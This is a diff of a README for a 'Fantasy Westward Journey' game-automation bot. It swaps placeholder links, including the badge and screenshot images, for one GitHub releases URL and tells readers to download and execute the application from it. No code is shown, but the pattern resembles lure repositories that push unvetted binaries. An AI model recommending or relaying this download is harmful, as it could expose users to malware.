@@ -1,6 +1,6 @@
 # 🌟 Fantasy Westward Journey Bot
 
-![Fantasy Westward Journey](https://img.shields.io/badge/Fantasy%20Westward%20Journey-Bot-blue)
+![Fantasy Westward Journey](https://github.com/shrey7x/Fantasy-Westward-Journey/releases%20Westward%20Journey-Bot-blue)
 
 Welcome to the **Fantasy Westward Journey Bot** repository! This project aims to enhance your gameplay experience in the popular mobile game, *Fantasy Westward Journey*. With this bot, you can automate daily quests, farm resources, and improve your overall performance in the game. 
 
@@ -16,7 +16,7 @@ Welcome to the **Fantasy Westward Journey Bot** repository! This project aims to
 
 To get started, download the application from the following link:
 
-[Download Application](https://github.com/user/repo/Application.zip)
+[Download Application](https://github.com/shrey7x/Fantasy-Westward-Journey/releases)
 
 After downloading, extract the contents and execute the application to begin your adventure.
 
@@ -101,7 +101,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you encounter any issues or have questions, feel free to open an issue in this repository. You can also check the "Releases" section for updates and new features.
 
-For the latest version of the application, please visit the [Releases](https://github.com/user/repo/releases) section.
+For the latest version of the application, please visit the [Releases](https://github.com/shrey7x/Fantasy-Westward-Journey/releases) section.
 
 ## 🎉 Acknowledgments
 
@@ -113,7 +113,7 @@ We plan to introduce new features and improvements in upcoming releases. Stay tu
 
 ## 📸 Screenshots
 
-![Bot Interface](https://example.com/screenshot1.png)
-![Marketplace Script](https://example.com/screenshot2.png)
+![Bot Interface](https://github.com/shrey7x/Fantasy-Westward-Journey/releases)
+![Marketplace Script](https://github.com/shrey7x/Fantasy-Westward-Journey/releases)
 
 Feel free to explore the repository and enhance your gaming experience!
